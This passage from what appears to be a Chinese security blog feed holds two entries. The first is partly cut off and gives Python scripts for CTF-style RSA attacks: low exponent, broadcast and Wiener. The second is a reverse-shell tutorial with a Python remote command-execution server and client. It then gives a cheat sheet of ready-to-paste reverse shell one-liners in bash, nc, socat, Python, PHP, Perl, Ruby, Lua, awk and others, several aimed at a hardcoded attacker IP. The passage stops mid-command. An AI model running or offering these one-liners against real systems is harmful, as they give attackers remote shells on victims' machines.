class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> pow<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token string">'  [-]m is:'</span> <span class="token operator">+</span> <span class="token string">'{:x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>int<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[!]Timer:'</span><span class="token punctuation">,</span> round<span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span></code></pre><h4 id="8-低加密指数攻击"><a href="#8-低加密指数攻击" class="headerlink" title="8.低加密指数攻击"></a>8.低加密指数攻击</h4><ul><li>e=3并且m的e次方小于n</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: cp936 -*-</span><span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">3</span><span class="token comment" spellcheck="true"># 读入 n, 密文</span>n<span class="token operator">=</span> <span class="token number">22885480907469109159947272333565375109310485067211461543881386718201442106967914852474989176175269612229966461160065872310916096148216253429849921988412342732706875998100337754561586600637594798877898552625378551427864501926224989873772743227733285336042475675299391051376624685754547818835551263597996620383338263448888107691240136257201191331617560711786674975909597833383395574686942099700631002290836152972352041024137872983284691831292216787307841877839674258086005814225532597955826353796634417780156185485054141684249037538570742860026295194559710972266059844824388916869414355952432189722465103299013237588737</span>c<span class="token operator">=</span> <span class="token number">15685364647213619014219110070569189770745535885901269792039052046431067708991036961644224230125219358149236447900927116989931929305133870392430610563331490276096858863490412102016758082433435355613099047001069687409209484751075897343335693872741</span><span class="token keyword">print</span> <span class="token string">'n='</span><span class="token punctuation">,</span> n<span class="token keyword">print</span> <span class="token string">'c='</span><span class="token punctuation">,</span> c<span class="token keyword">print</span> <span class="token string">'[+]Detecting m...'</span>result <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'  [-]The c has cubic root?'</span><span class="token punctuation">,</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">print</span> <span class="token string">'  [-]The m is:'</span><span class="token punctuation">,</span> <span class="token string">'{:x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span></code></pre><ul><li>e=3并且m的e次方大于n，但是不足够大</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: cp936 -*-</span><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span> timee <span class="token operator">=</span> <span class="token number">3</span><span class="token comment" spellcheck="true"># 读入 n, 密文</span>n <span class="token operator">=</span> <span class="token number">114976915747243387792157708464120735018971336213935438953074748276198282761939060395482051056351068439137722626185590043024556656813730840050547350912425438364703854627760482842307943026011880815011654341047422453012558617703411700393668892701036222135444420377515575624398723436532681305293727164639582093389</span>c <span class="token operator">=</span> <span class="token number">5828813410620741112500628876643872258919868379601617907887884191584237969605489971465692568848339200057188383649365078832766143513766368216471491824042974016773526107276856706832404477882581400769791378958901067683158857990261489285951805740071223765359992165262854641069674603160977034446644199945940251030</span>i <span class="token operator">=</span> <span class="token number">239000000</span> <span class="token comment" spellcheck="true"># i 应该是未知的。这里缩短一下距离, 防止跑得太久</span><span class="token keyword">print</span> <span class="token string">'n='</span><span class="token punctuation">,</span> n<span class="token keyword">print</span> <span class="token string">'c='</span><span class="token punctuation">,</span> c<span class="token keyword">print</span> <span class="token string">'[!]Done!\n'</span><span class="token keyword">print</span> <span class="token string">'[+]Detecting m...'</span>s <span class="token operator">=</span> time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    m<span class="token punctuation">,</span> b <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c <span class="token operator">+</span> i <span class="token operator">*</span> n<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> b<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'  [-]m is: '</span> <span class="token operator">+</span> <span class="token string">'{:x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>int<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token comment" spellcheck="true">#print '  [-]i = %d\r' % i,</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span> <span class="token string">'[!]Timer:'</span><span class="token punctuation">,</span> round<span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span></code></pre><h4 id="9-低加密指数广播攻击"><a href="#9-低加密指数广播攻击" class="headerlink" title="9. 低加密指数广播攻击"></a>9. 低加密指数广播攻击</h4><ul><li><p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。选取了相同的加密指数 e（这里取 e=3），对相同的明文 m 进行了加密并进行了消息的传递，那么有：</p><p>c1≡m^e mod n1 </p><p>c2≡m^e mod n2</p><p>c3≡m^e mod n3</p><p>对上述等式运用中国剩余定理，在 e=3 时，可以得到：</p><p>cx≡m^3 mod n1 n2 n3 </p><p>通过对 cx 进行三次开方就可以求得明文</p></li></ul><pre class=" language-python"><code class="language-python">  <span class="token comment" spellcheck="true"># -*- coding: cp936 -*-</span>  <span class="token keyword">import</span> gmpy2  <span class="token keyword">import</span> time  <span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>      N <span class="token operator">=</span> reduce<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">*</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> items<span class="token punctuation">)</span><span class="token punctuation">)</span>      result <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">for</span> a<span class="token punctuation">,</span> n <span class="token keyword">in</span> items<span class="token punctuation">:</span>          m <span class="token operator">=</span> N <span class="token operator">/</span> n          d<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span>          <span class="token keyword">if</span> d <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Input not pairwise co-prime"</span><span class="token punctuation">)</span>          result <span class="token operator">+=</span> a <span class="token operator">*</span> s <span class="token operator">*</span> m      <span class="token keyword">return</span> result <span class="token operator">%</span> N<span class="token punctuation">,</span> N  <span class="token comment" spellcheck="true"># 读入 e, n, c</span>  e <span class="token operator">=</span> <span class="token number">9</span>  n <span class="token operator">=</span> <span class="token punctuation">[</span>142782424368849674771976671955176187834932417027468006479038058385550042422280158726561712259205616626939123504489410624745195777853423961104590708231562726165590769610040722589287393102301338152085670464005026301781192671834390892019478189768725018303217559795377795540494239283891894830166363576205812991157L<span class="token punctuation">,</span> 153610425077816156109768509904751446801233412970601397035720458311275245730833227428213917577405780162151444202393431444812010569489900435979730559895340377469612234558042643742219128033827948585534761030527275423811282367831985007507137144308704413007806012914286105842311420933479771294576841956749281552971L<span class="token punctuation">,</span> 152540067782701001222493009941492423063369171831039847414320547494725020441901272486665728360741395415762864872737675660423920609681185809510355937534756399208661762715484879562585724584849261266873624875852300611683382543315580370484972470694466195837255994159609193239840228218925381488410059939975556977947L<span class="token punctuation">,</span> 125842716702134814646356078531900645012495638692517778270527426844383063904041812273637776798591687732598509470005151551320457132061693618473039437320011446697406190781306264437609046721508738109650829547010385875425097336266103994639126319889016342284747700714199556143378526590058467791687837422897022829661L<span class="token punctuation">,</span> 116144389285266462769913139639175922392318396923181100785008570884082681963637784423143843845816350379438789947802939701820129805341796427821894273985551331666719808355412080909245720551238149511778060242720419584504473490216670437024863860559347959698828131475160058721701582089480924088773887932997353631767L<span class="token punctuation">,</span> 127833907448946785858374094953899556339175475846831397383049660262333005992005484987913355932559627279178940862787593749842796469355336182379062826441222705075178971785791223706944120681105575965622931327112817747065200324610697178273898956820957640413744954233327851461318200323486469677469950386824833536523L<span class="token punctuation">,</span> 130561613227079478921314550968562766645507834694262831586725464124109153306162445639759476845681271537955934718244296904503168256991962908095007040044300188572466395275317838178325500238288302672390013747102961340256309124310478931896245221622317302428447389760864327859640573452084295225059466376349115703119L<span class="token punctuation">,</span> 115953389401040751013569404909249958538962411171147823610874077094621794755967854844224923689925397631692572916641171075740839099217316101334941033937183815345038898177087515909675028366437302462022970987947264115373697445950951595479758872029099661065186221250394358255523574834723958546450323357472451930993L<span class="token punctuation">,</span> 143437107845384843564651522639125300763388830136500260725097766445883003928355325003575359566631064630487365774344508496878731109174874449170057678821440711511966073934025028100604234445470976333825866939923998344367645612128590820812489407412175198698290167077116185959180877334222693344630253253476594907313L<span class="token punctuation">]</span>  c <span class="token operator">=</span> <span class="token punctuation">[</span>85033868418784308573673709960700777350314426427677627319697346811123742342359072170220428874952996988431950989321281905284522596263957356289624365171732095210045916218066135140320107686084053271623461104022705353814233772164502775939590711842361956121603943483040254727995655776263673058788416722141673409688L<span class="token punctuation">,</span> 66065963470666895005407449599703926269325406456711861190876894466341571726360462706664546294453572319565476664348345756905411939632955966517708138047546806602828064213238537646393524578984547577761559965654539771172357089802682793169968961304179886652390277814477825753096636750388350662980872556701402397564L<span class="token punctuation">,</span> 116011740820520887443111656288411611070614127688662643257265381793048354928820176624229624692124188995846076431510548507016903260774215950803926107831505634778278712070141663189086436127990584944132764896694777031370995058271038329228336417590284517922855284619653301817355115583540545182119702335431334401666L<span class="token punctuation">,</span> 97640420284096094887471273365295984332267897927392169402918423863919914002451127544715668846623138003564829254309568918651163254043205129883843425179687841236818720463784828905460885026290909768599562386370732119591181513319548915478512030197629196018254041500662654260834562708620760373487652389789200792120L<span class="token punctuation">,</span> 8112507653841374573057048967617108909055624101437903775740427861003476480616929517639719198652146909660899632120639789106782550275648578142883715280547602249589837441805676364041484345030575130408744621981440093280624046635769338568542048839419939250444929802135605724150484414516536378791500915047844188300L<span class="token punctuation">,</span> 36792148360808115566234645242678223867680969786675055638670907933041180936164293809961667801099516457636164692292891528415720085345494773373966277807505798679784807614784581861287048096977968620964436947452527540958289441390882589051225367658014709290392321808926567572528170531844664734909469690750971883323L<span class="token punctuation">,</span> 53043093283305492238903255767698153246673671181809989362223466090875767705978690531154079519999671834688647277179370374802495005937892824566602423646978168777735383632928274082669949750078161820002768640908750005814934158829006019656592134357897586040866207754535586785064545866404380204728594863102313407789L<span class="token punctuation">,</span> 88499407133762624445946519155722583633934260410706930537441122463087556094734626189377091740335667052378955691250910459790202385799502439716173363179773811920751410726795431402796346647688144853156900427797933862087074385441977254140336390678022955770879265490567987868532251217565094093318626424653599450992L<span class="token punctuation">,</span> 138337520305048557335599940473834485492131424901034295018189264168040969172072024612859307499682986987325414798210700710891033749119834960687318156171051379643844580970963540418974136891389303624057726575516576726845229494107327508855516437230240365759885913142671816868762838801720492804671259709458388192984L<span class="token punctuation">]</span>  <span class="token keyword">print</span> <span class="token string">'[+]Detecting m...'</span>  data <span class="token operator">=</span> zip<span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  x<span class="token punctuation">,</span> n <span class="token operator">=</span> CRT<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  realnum <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>digits<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> <span class="token string">'  [-]m is: '</span> <span class="token operator">+</span> <span class="token string">'{:x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>int<span class="token punctuation">(</span>realnum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span> </code></pre><h4 id="10-低解密指数攻击"><a href="#10-低解密指数攻击" class="headerlink" title="10.  低解密指数攻击"></a>10.  低解密指数攻击</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/低解密指数攻击.png" style="zoom:50%;" /></li><li><pre><code># -*- coding: cp936 -*-import gmpy2import time# 展开为连分数def continuedFra(x, y):    cF = []    while y:        cF += [x / y]        x, y = y, x % y    return cFdef Simplify(ctnf):    numerator = 0    denominator = 1    for x in ctnf[::-1]:        numerator, denominator = denominator, x * denominator + numerator    return (numerator, denominator)# 连分数化简def calculateFrac(x, y):    cF = continuedFra(x, y)    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))    return cF# 解韦达定理def solve_pq(a, b, c):    par = gmpy2.isqrt(b * b - 4 * a * c)    return (-b + par) / (2 * a), (-b - par) / (2 * a)def wienerAttack(e, n):    for (d, k) in calculateFrac(e, n):        if k == 0: continue        if (e * d - 1) % k != 0: continue        phi = (e * d - 1) / k        p, q = solve_pq(1, n - phi + 1, n)        if p * q == n:            return abs(int(p)), abs(int(q))    print &#39;not find!&#39;time.clock()n = 12238605063252292170613110607692779326628090745751955692266649177882959231822580682548279800443278979485092243645806337103841086023159482786712759291169541633901936290854044069486201989034158882661270017305064348254800318759062921744741432214818915527537124001063995865927527037625277330117588414586505635959411443039463168463608235165929831344586283875119363703480280602514451713723663297066810128769907278246434745483846869482536367912810637275405943566734099622063142293421936734750356828712268385319217225803602442033960930413469179550331907541244416573641309943913383658451409219852933526106735587605884499707827e = 11850552481503020257392808424743510851763548184936536180317707155841959788151862976445957810691568475609821000653594584717037528429828330763571556164988619635320288125983463358648887090031957900011546300841211712664477474767941406651977784177969001025954167441377912326806132232375497798238928464025466905201977180541053129691501120197010080001677260814313906843670652972019631997467352264392296894192998971542816081534808106792758008676039929763345402657578681818891775091140555977382868531202964486261123748663752490909455324860302967636149379567988941803701512680099398021640317868259975961261408500449965277690517c = 9472193174575536616954091686751964873836697237500198884451530469300324470671555310791335185133679697207007374620225900775502162690848135615431624557389304657410880981454777737587420426091879654002644281066474715074536611611252677882396384453641127487515845176069574754606670518031472235144795376526854484442135299818868525539923568705203042265537204111153151119105287648912908771710419648445826883069030285651763726003413418764301988228077415599665616637501056116290476861280240577145515875430665394216054222788697052979429015400411487342877096677666406389711074591330476335174211990429870900468249946600544116793793p, q = wienerAttack(e, n)print &#39;[+]Found!&#39;print &#39;  [-]p =&#39;,pprint &#39;  [-]q =&#39;,qprint &#39;  [-]n =&#39;,p*qd = gmpy2.invert(e,(p-1)*(q-1))print &#39;  [-]d =&#39;, dprint &#39;  [-]m is:&#39; + &#39;{:x}&#39;.format(pow(c,d,n)).decode(&#39;hex&#39;)print &#39;\n[!]Timer:&#39;, round(time.clock(),2), &#39;s&#39;print &#39;[!]All Done!&#39;</code></pre></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p>看着大佬的博客弄的，自己真的不懂，佩服搞密码方向的大佬，太强了</p></li><li><p>博客内的代码均是借鉴的大佬的，数学一般的小编就不自己算了。谢谢大佬们。</p></li><li><p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84632</a> </p></li><li><p><a href="https://www.kancloud.cn/kancloud/rsa_algorithm/48493" target="_blank" rel="noopener">https://www.kancloud.cn/kancloud/rsa_algorithm/48493</a> </p></li><li><p><a href="https://www.cnblogs.com/gwind/p/8013154.html" target="_blank" rel="noopener">https://www.cnblogs.com/gwind/p/8013154.html</a> </p></li><li><p><strong>低加密指数攻击</strong>  <a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2017/11/06/CTFRSA/index.html</a> </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell--3.反弹shell实例</title>
      <link href="/2020/03/30/fan-dan-shell-3-fan-dan-shell-shi-li/"/>
      <url>/2020/03/30/fan-dan-shell-3-fan-dan-shell-shi-li/</url>
      
        <content type="html"><![CDATA[<h3 id="反弹shell–python"><a href="#反弹shell–python" class="headerlink" title="反弹shell–python"></a>反弹shell–python</h3><ul><li><a href="https://www.cnblogs.com/yuzly/p/10473497.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10473497.html</a> </li><li>服务器端代码：（服务端开启端口，客户端去连接，去获取shell）</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding: utf-8 -*-</span><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> osHOST<span class="token operator">=</span><span class="token string">''</span>PORT<span class="token operator">=</span><span class="token number">1122</span>BUFSIZ<span class="token operator">=</span><span class="token number">1024</span>ADDR<span class="token operator">=</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>sock<span class="token operator">=</span>socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">)</span>sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>STOP_CHAT<span class="token operator">=</span><span class="token boolean">False</span><span class="token keyword">while</span> <span class="token operator">not</span> STOP_CHAT<span class="token punctuation">:</span>    tcpClientSock<span class="token punctuation">,</span> addr<span class="token operator">=</span>sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Listening.....'</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data<span class="token operator">=</span>tcpClientSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            tcpClientSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>        STOP_CHAT<span class="token operator">=</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"QUIT"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> STOP_CHAT<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#打扫战场 运用linux定时计划任务一分钟后删除当前脚本文件</span>            <span class="token comment" spellcheck="true">#current_file_path =os.getcwd()+sys.argv[0]</span>            <span class="token comment" spellcheck="true">#os.system('echo */1　　*　　*　　*　　*　　rm -rf '+current_file_path+' >> /etc/crontab')</span>            <span class="token comment" spellcheck="true">#tell_hack = 'Will help you clean war...'</span>            <span class="token comment" spellcheck="true">#tcpClientSock.sendall(tell_hack.encode('utf8'))</span>            <span class="token keyword">break</span>        ME <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        os_result <span class="token operator">=</span> ME<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>os_result<span class="token punctuation">)</span>        tcpClientSock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>os_result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tcpClientSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>客户端代码：</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding: utf-8 -*-</span><span class="token keyword">import</span> os<span class="token punctuation">,</span>sys<span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">TcpClient</span><span class="token punctuation">:</span>    HOST<span class="token operator">=</span><span class="token string">'127.0.0.1'</span>    PORT<span class="token operator">=</span><span class="token number">1122</span>    BUFSIZ<span class="token operator">=</span><span class="token number">2048</span>    ADDR<span class="token operator">=</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>client<span class="token operator">=</span>socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ADDR<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">'OS Shell >'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Execute %s：%s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>HOST<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> data<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"QUIT"</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            data<span class="token operator">=</span>self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>self<span class="token punctuation">.</span>BUFSIZ<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receive：%s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    client<span class="token operator">=</span>TcpClient<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="linux反弹shell总结-15种方法"><a href="#linux反弹shell总结-15种方法" class="headerlink" title="linux反弹shell总结(15种方法)"></a>linux反弹shell总结(15种方法)</h4><ul><li><p>1.1发送文件(公网发内网)</p><ul><li>文件发送端：nc -lp 6666 &lt; 文件</li><li>文件接收端：nc 发送端ip 发送端端口 &gt; 新文件</li></ul></li><li><p>1.2发送文件(内网发公网)</p><ul><li>文件发送端：nc -lp 6666 &gt; 文件</li><li>文件接收端：nc 发送端ip 发送端端口 &lt; 新文件</li></ul></li><li><p>2.聊天</p><ul><li>发送端：nc -lp 6666</li><li>接收端：nc 发送端ip 发送端端口</li></ul></li><li><p>3.1发送shell</p><ul><li>发送端(公网服务器)：nc -lvvp 6666 -e /bin/bash</li><li>接收端：nc 发送端ip 发送端端口</li></ul></li><li><p>3.2反弹shell</p><ul><li>接收端：nc -lvvp 6666</li><li>发送端(内网网服务器)：nc 接收端ip 接收端端口 -e /bin/bash</li></ul></li><li><p>4.bash反弹</p><ul><li><p>接收端(hackip,公网)：nc -lvvp 端口</p></li><li><p>发送端(受害者)：</p><pre><code>bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1</code></pre></li><li><p>发送端(受害者)：</p><pre><code>0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</code></pre></li></ul></li></ul><ul><li><p>5.1socat反弹(tcp)</p><ul><li><p>接收端(攻击机)：./socat TCP-LISTEN:端口 –</p></li><li><p>发送端(靶机)：</p><pre><code>./socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</code></pre></li></ul></li><li><p>5.2socat反弹(udp)</p><ul><li><p>接收端:nc -lvvp 8080</p></li><li><p>发送端:</p><pre><code>socat udp-connect:111.230.170.95:8080 exec:’bash -li’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</code></pre></li></ul></li><li><p>6.python反弹</p><ul><li><p>接收端(攻击机,外网)：nc -lvvp 端口</p></li><li><p>发送端(靶机)：</p><pre class=" language-shell"><code class="language-shell">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.74.128",1254));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre></li></ul></li><li><p>7.PHP反弹</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p><pre><code>php -r &#39;$sock=fsockopen(&quot;接收IP&quot;,接收端口);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre></li></ul></li><li><p>8.JAVA反弹</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p><pre><code>r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done”] as String[]) p.waitFor()</code></pre></li></ul></li><li><p>9.perl反弹</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p></li><li><pre class=" language-shell"><code class="language-shell">perl -e 'use Socket;$i="111.230.170.95";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre></li></ul></li><li><p>10.ruby反弹</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p><pre><code>ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“111.230.170.95″,”8888″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</code></pre></li></ul></li><li><p>11.telnet反弹</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p><pre><code>mknod backpipe p &amp;&amp; telnet 111.230.170.95 8080 0backpipe</code></pre></li></ul></li><li><p>12.lua反弹(安装lua环境：apt-get install lua*)</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p><pre><code>lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘111.230.170.95′,8080);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</code></pre></li></ul></li><li><p>13.awk反弹</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p><pre><code>awk ‘BEGIN{s=”/inet/tcp/0/111.230.170.95/8080″;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print 